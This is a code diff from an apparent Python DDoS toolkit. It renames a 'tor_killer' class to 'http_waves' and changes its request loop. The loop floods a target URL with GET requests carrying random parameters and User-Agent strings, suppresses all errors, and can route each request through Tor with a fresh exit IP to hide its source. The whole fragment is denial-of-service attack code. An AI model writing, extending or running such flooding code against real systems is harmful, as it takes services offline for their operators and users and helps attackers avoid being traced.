@@ -1,6 +1,6 @@
 from bane.ddos.utils import *
 
-class tor_killer(DDoS_Class):
+class http_waves(DDoS_Class):
     def __init__(
         self,
         u,
@@ -65,16 +65,21 @@ class tor_killer(DDoS_Class):
                     break
                 try:
                     data={}
+                    files={}
+                    files_count=random.randint(0,2)
+                    
                     params_count=random.randint(0,5)
                     for x in range(params_count):
                         key_len=random.randint(0,15)
                         key=''.join([random.choice(lis) for x in range(key_len)])
-                        val_len=random.randint(0,50)
+                        val_len=random.randint(0,100)
                         val=''.join([random.choice(lis) for x in range(val_len)])
                         data.update({key:val})
-                    usr=''.join([random.choice(lis) for x in range(5)])
-                    pwd=''.join([random.choice(lis) for x in range(5)])
-                    requests.get(self.target,params=data,proxies={'http': 'socks5h://{}:{}@localhost:9150'.format(usr,pwd),'http': 'socks5h://{}:{}@localhost:9150'.format(usr,pwd)},timeout=self.timeout,verify=False,headers={'User-Agent':random.choice(ua)})
+                    if self.tor==True:
+                        proxy=get_tor_socks5_proxy(new_ip=True)
+                    else:
+                        proxy=None
+                    requests.get(self.target,params=data,proxies=proxy,timeout=self.timeout,verify=False,headers={'User-Agent':random.choice(ua)})
                     self.counter+=1
                 except Exception as ex:
                     pass
